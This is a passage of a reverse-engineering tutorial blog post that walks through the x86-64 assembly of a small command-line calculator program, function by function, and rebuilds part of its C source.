</span></span><span class="line"><span class="cl">        <span class="nf">je</span>      <span class="no">.L15</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">43</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jne</span>     <span class="no">.L13</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:</span><span class="no">addFunc</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jmp</span>     <span class="no">.L13</span>
</span></span><span class="line"><span class="cl"><span class="nl">.L14:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:</span><span class="no">subFunc</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jmp</span>     <span class="no">.L13</span>
</span></span><span class="line"><span class="cl"><span class="nl">.L15:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:</span><span class="no">mulFunc</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jmp</span>     <span class="no">.L13</span>
</span></span><span class="line"><span class="cl"><span class="nl">.L12:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:</span><span class="no">divFunc</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl"><span class="nl">.L13:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edx</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-16</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-12</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rcx</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="no">edx</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">rcx</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">movsx</span>   <span class="no">edx</span><span class="p">,</span> <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-17</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">ecx</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-16</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-12</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">r8d</span><span class="p">,</span> <span class="no">esi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:.</span><span class="no">LC2</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">printf</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">leave</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>This is far too large to handle at once. So I&rsquo;ll start with smaller functions and see what they do before moving on to the <code>main</code> function.</p>
<p><em>(In my opinion, there is no specific reverse engineering flow. You could start from anywhere that suits your needs and the project at hand.)</em></p>
<p>Now the first function I&rsquo;ll start with is going to be the <code>addFunc</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">addFunc:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="no">edi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">esi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edx</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">add</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">edx</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>The first three lines are simply the function&rsquo;s label and prologue.</p>
<p>Then there are two <code>mov</code> statements (lines 4 and 5) that involve <code>edi</code> (first argument) and <code>esi</code> (second argument) (second argument). They are the function arguments passed from the calling function to this function. These values are then saved in the <code>[rbp-4]</code> and <code>[rbp-8]</code> local variables.</p>
<p>Given the variable size requirements (4 bytes each), it is safe to assume that the passed variables are of the <code>int</code> type. That is, we are passing this function two <code>int</code> values.</p>
<p>Then, at lines 6, 7, and 8, we simply load the values from the variables into some registers and then add them up. In this case, the result of the add instruction will be stored in the <code>eax</code> register. Remember, this is also the register where the return value of a function is stored. So when we return back from this function, we have our addition result in the <code>eax</code> register.</p>
<p>Finally, at line 9 &amp; 10, we make a graceful return from the function.</p>
<p>Similar behaviour is followed by next 3 functions - <code>subFunc</code>, <code>mulFunc</code> and <code>divFunc</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">subFunc:</span>
</span></span><span class="line"><span class="cl">        <span class="c1">; Prologue
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="c1">; Function arguments
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="no">edi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">esi</span>
</span></span><span class="line"><span class="cl">        <span class="c1">; Load values and perform subtraction
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sub</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="c1">; Return value is already in EAX, just return
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">mulFunc:</span>
</span></span><span class="line"><span class="cl">        <span class="c1">; Prologue
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="c1">; Function arguments
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="no">edi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">esi</span>
</span></span><span class="line"><span class="cl">        <span class="c1">; Load values and perform multiplication
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">imul</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="c1">; Return value is already in EAX, just return
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">divFunc:</span>
</span></span><span class="line"><span class="cl">        <span class="c1">; Prologue
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="c1">; Function arguments
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="no">edi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">esi</span>
</span></span><span class="line"><span class="cl">        <span class="c1">; Load values and perform division
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cdq</span>
</span></span><span class="line"><span class="cl">        <span class="nf">idiv</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="c1">; Return value is already in EAX, just return
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>Now we are done with all the functions that perform the computations, next comes the function which prints the help message and then exits.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.LC0:</span>
</span></span><span class="line"><span class="cl">        <span class="na">.string</span> <span class="s">&#34;Not enough arguments passed&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nl">.LC1:</span>
</span></span><span class="line"><span class="cl">        <span class="na">.string</span> <span class="s">&#34;Usage: ./calc &lt;num1&gt; &lt;operator&gt; &lt;num2&gt;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nl">die:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:.</span><span class="no">LC0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">puts</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:.</span><span class="no">LC1</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">puts</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">exit</span>
</span></span></code></pre></div><p>The name implies that the purpose of this function is to terminate the execution of the <code>calc</code> program. Lines 8-9 show that this function is printing something using the <code>puts</code> function. The function&rsquo;s argument is a string starting at offset <code>.LC0</code> - <code>&quot;Insufficient arguments passed&quot;</code>. Lines 9-10 contain another call for <code>puts</code> with an argument from offset <code>.LC1</code> - <code>&quot;Usage: ./calc &lt;num1&gt; &lt;operator&gt; &lt;num2&gt;&quot;</code>.</p>
<p>These both <code>puts</code> statements combined give the error message we got when we tried to execute the program without any arguments.</p>
<p>Finally, it terminates with an <code>exit</code> function call (no return), and the function&rsquo;s argument was the integer value <code>1</code>. Typically, the return value for successful execution is zero, and all non-zero values denote some type of execution error. <strong>So exiting with 1 indicates an error.</strong></p>
<p>Now we know what each function do at atomic level. Let&rsquo;s load our big guns and take a shot at <code>main()</code> function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.LC2:</span>
</span></span><span class="line"><span class="cl">        <span class="na">.string</span> <span class="s">&#34;%d %c %d = %d\n&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sub</span>     <span class="no">rsp</span><span class="p">,</span> <span class="mi">48</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-36</span><span class="p">],</span> <span class="no">edi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-48</span><span class="p">],</span> <span class="no">rsi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-36</span><span class="p">],</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jg</span>      <span class="no">.L11</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">die</span>
</span></span><span class="line"><span class="cl"><span class="nl">.L11:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-48</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">add</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">atoi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-12</span><span class="p">],</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-48</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">add</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">24</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">atoi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-16</span><span class="p">],</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-48</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">add</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">movzx</span>   <span class="no">eax</span><span class="p">,</span> <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-17</span><span class="p">],</span> <span class="no">al</span>
</span></span><span class="line"><span class="cl">        <span class="nf">movsx</span>   <span class="no">eax</span><span class="p">,</span> <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-17</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">47</span>
</span></span><span class="line"><span class="cl">        <span class="nf">je</span>      <span class="no">.L12</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">47</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jg</span>      <span class="no">.L13</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">45</span>
</span></span><span class="line"><span class="cl">        <span class="nf">je</span>      <span class="no">.L14</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">45</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jg</span>      <span class="no">.L13</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">42</span>
</span></span><span class="line"><span class="cl">        <span class="nf">je</span>      <span class="no">.L15</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">43</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jne</span>     <span class="no">.L13</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:</span><span class="no">addFunc</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jmp</span>     <span class="no">.L13</span>
</span></span><span class="line"><span class="cl"><span class="nl">.L14:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:</span><span class="no">subFunc</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jmp</span>     <span class="no">.L13</span>
</span></span><span class="line"><span class="cl"><span class="nl">.L15:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:</span><span class="no">mulFunc</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jmp</span>     <span class="no">.L13</span>
</span></span><span class="line"><span class="cl"><span class="nl">.L12:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:</span><span class="no">divFunc</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl"><span class="nl">.L13:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edx</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-16</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-12</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rcx</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="no">edx</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">rcx</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">movsx</span>   <span class="no">edx</span><span class="p">,</span> <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-17</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">ecx</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-16</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-12</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">r8d</span><span class="p">,</span> <span class="no">esi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:.</span><span class="no">LC2</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">printf</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">leave</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>The <code>main</code> function still appears to be too large to handle all at once, so I&rsquo;ll cut it into smaller chunks to bite off and digest properly.</p>
<p>The prologue comes first&hellip; setting up the function frame; nothing new here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span></code></pre></div><p>Then we make some space in the frame to store the local variables.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">        <span class="nf">sub</span>     <span class="no">rsp</span><span class="p">,</span> <span class="mi">48</span>
</span></span></code></pre></div><p>And then storing <code>edi</code> and <code>rsi</code> values in there. If you remember these two registers indicate the first two arguments passed to a function. In this case, the arguments to main function will be the <code>argc</code> and <code>argv</code>.</p>
<ul>
<li><code>argc</code> &ndash;&gt; Count of the cli arguments passed to it.</li>
<li><code>argv</code> &ndash;&gt; Pointer to the list of arguments passed.</li>
</ul>
<p>Next up is the comparision&hellip;which will check the count of args. This decides the branch the program execution takes - die or live.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-36</span><span class="p">],</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jg</span>      <span class="no">.L11</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">die</span>
</span></span></code></pre></div><p>This compares <code>[rbp-36]</code> (<code>argc</code>) with hardcoded value of <code>3</code>. If the value from <code>argc</code> is greater than <code>3</code> then it&rsquo;ll make a jump to <code>.L11</code>, otherwise it&rsquo;ll call <code>die</code> function&hellip; which will print some messages and then <code>exit</code> with status <code>1</code>. We already looked at that.</p>
<p>So if we write a C program for what we know about <code>main</code> till now, we&rsquo;ll get something like:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nf">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="cm">/* Keep on going to know more */</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Next statements are something new, so you&rsquo;ll have to believe me when I say that this is equivalent to <code>argv[1]</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.L11:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-48</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">add</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
</span></span></code></pre></div><p>Before I start explaining, take a look at this diagram.</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 840 489"
      >
      <g transform='translate(8,16)'>
<text text-anchor='middle' x='24' y='180' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='32' y='180' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='40' y='180' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='48' y='196' fill='currentColor' style='font-size:1em'>┌</text>
